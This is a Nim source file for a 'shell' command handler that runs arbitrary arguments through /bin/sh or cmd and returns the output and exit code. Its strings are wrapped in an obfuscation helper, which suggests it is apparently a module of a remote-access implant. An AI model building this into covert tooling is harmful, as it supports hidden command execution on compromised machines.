#[
    Cross-Platform shell Command
    Interactive shell command execution
    Compatible with Linux, macOS, and other Unix-like systems
]#

import osproc, strutils
import ../../util/strenc

proc shell*(args: seq[string]): string =
    try:
        if args.len < 1:
            return obf("ERROR: shell requires at least one argument.\nUsage: shell <command>")
        
        let command = args.join(" ")
        
        when defined verbose:
            echo obf("DEBUG: Executing shell command: ") & command
        
        # Execute command through shell
        let shellCmd = when defined(windows): "cmd /c " & command
                       else: "/bin/sh -c '" & command.replace("'", "'\"'\"'") & "'"
        
        let (output, exitCode) = execCmdEx(shellCmd)
        
        when defined verbose:
            echo obf("DEBUG: Shell command completed with exit code: ") & $exitCode
        
        var result = obf("Shell Command: ") & command & "\n"
        result.add(obf("Exit Code: ") & $exitCode & "\n")
        result.add(obf("Output:\n"))
        result.add("=" & "=".repeat(50) & "\n")
        
        if output.len > 0:
            result.add(output)
        else:
            result.add(obf("(No output)"))
        
        result.add("\n" & "=".repeat(50))
        
        return result
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: shell failed: ") & e.msg
        return obf("ERROR: Shell command failed - ") & e.msg 